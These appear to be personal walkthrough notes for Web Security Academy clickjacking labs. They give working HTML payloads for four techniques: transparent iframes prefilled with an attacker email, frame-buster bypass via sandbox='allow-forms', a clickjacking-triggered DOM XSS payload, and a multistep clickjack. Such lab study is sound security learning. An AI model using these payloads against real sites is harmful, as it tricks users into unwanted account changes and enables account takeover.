Basically an iframe is overlayed on top of a decoy website, and when user clicks on some button, they actually click on the website from iframe

### Lab: Clickjacking with form input data prefilled from a URL parameter
```bash
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 498px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a490087042981a781a3255e003800b1.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Note on the website that is loaded by the iframe we have:
```bash
<input required="" type="email" name="email" value="hacker@attacker-website.com">
```
The `value` of that input will be automatically populated if the url includes `?email=hacker@attacker-website.com`

### Lab: Clickjacking with a frame buster script
An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

```bash
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 498px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0ab700f604ad875280b8bc90004a00c8.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Pay attention to `iframe sandbox="allow-forms"`

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
There's a `submit feedback` form on the website with `name`, `email`, `subject` input fields.
`name` is vulnerable to xss so we can do the following:
```bash
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 614px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe
src="https://ff.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

### Lab: Multistep clickjacking
```bash
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
   .firstClick {
		position:absolute;
		top: 497px;
        left: 50px;
		z-index: 1;
	}
   .secondClick {
		position:absolute;
        top: 300px;
        left: 210px;
		z-index: 1;
	}
</style>
<div class="firstClick"> Click me first</div>
<div class="secondClick"> Click me next</div>
<iframe src="https://0a5100320469aa4280803a59000000a3.web-security-academy.net/my-account"></iframe>
```
